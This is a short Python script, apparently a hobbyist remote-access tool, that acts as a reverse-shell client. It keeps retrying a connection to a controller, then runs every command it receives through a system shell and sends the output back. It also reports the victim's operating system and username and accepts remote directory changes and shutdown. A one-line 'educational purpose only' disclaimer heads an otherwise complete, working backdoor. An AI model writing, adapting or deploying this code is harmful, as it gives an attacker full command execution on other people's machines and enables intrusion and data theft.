#!/usr/bin/python


import subprocess
import platform
import getpass
import socket
import time
import sys
import os


# This code is for educational purpose only !!!
# i am not responsible if you use this code for a malicious behavior.

def connect():
     global host
     global port
     global sock

     while True:
          # While connection is not establish retry.
          try:
               sock.connect((host, port))
               break

          except:
               time.sleep(1)

     log('Connected to server')


def controlled():
     global sock

     while True:
          try:
               data = sock.recv(20480)
               data = data.decode('utf-8')

               log('Received data')
               cwd = '\n{user}:{cwd}>'.format(user=getpass.getuser(), cwd=os.getcwd())

               if not data:
                    log('No data connection broken')
                    sock.close()
                    time.sleep(5)
                    main()

               elif data == '//close':
                    log('Connection closed by the server')
                    sock.send(str.encode('Client shutdown'))
                    sock.close()
                    break

               elif data == '/debug':
                    global debug
                    debug = not debug
                    sock.send(str.encode('Debug output set to ' + ('True' if debug else 'False') + cwd))

               elif data == '//help':
                    global version
                    log('Sending client commands to the server')
                    commands = '\n'.join([
                         '--CLIENT COMMANDS--',
                         '  Client version' + str(version), '',
                         ' //close : close the connection',
                         ' /debug : toggle debug output on client machine',
                         ' //help : show this message',
                         ' /machine : get machine info',
                         ' /shutdown : shutdown the client', ''
                    ])
                    sock.send(str.encode(commands + cwd))

               elif data == '/machine':
                    log('Sending info about machine to server')
                    info = '\nDist: {dist}\nRelease: {rele}\nSystem: {syst}\nUser: {user}\n{cwd}'.format(
                         dist=platform.dist(),
                         rele=platform.release(),
                         syst=platform.system(),
                         user=getpass.getuser(),
                         cwd=cwd,
                    )
                    sock.send(str.encode(info))

               elif data == '/shutdown':
                    log('Client shutdown by the server')
                    sock.send(str.encode('Client shutdown'))
                    sock.close()
                    sys.exit()

               elif data[:2] == 'cd':
                    try:
                         os.chdir(data[3:])
                         log('Changed dir')

                    except:
                         log('Failed to change dir')

                    cwd = '{user}:{cwd}>'.format(user=getpass.getuser(), cwd=os.getcwd())
                    sock.send(str.encode(cwd))

               elif len(data) > 0:
                    log('Running command :', data)
                    pipe = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, \
                                            stderr=subprocess.PIPE, stdin=subprocess.PIPE)

                    output = str(pipe.stdout.read() + pipe.stderr.read(), 'utf-8')
                    sock.send(str.encode('{out}{cwd}'.format(out=output, cwd=cwd)))

          except Exception as error:
               log('Client error :', error, 'for data :', data)
               sock.send(str.encode("Client error: '{err}' for data '{dat}'{cwd}".format(err=error, dat=data, cwd=cwd)))


def log(*logs):
     global debug

     if debug:
          for v in logs:
               sys.stdout.write(str(v) + ' ')

          print()


def main():
     global debug
     global host
     global port
     global sock
     global version

     debug = False
     host = '127.0.0.1'
     port = 9999
     sock = socket.socket()
     version = 0.01

     connect()
     controlled()


if __name__ == '__main__':
     main()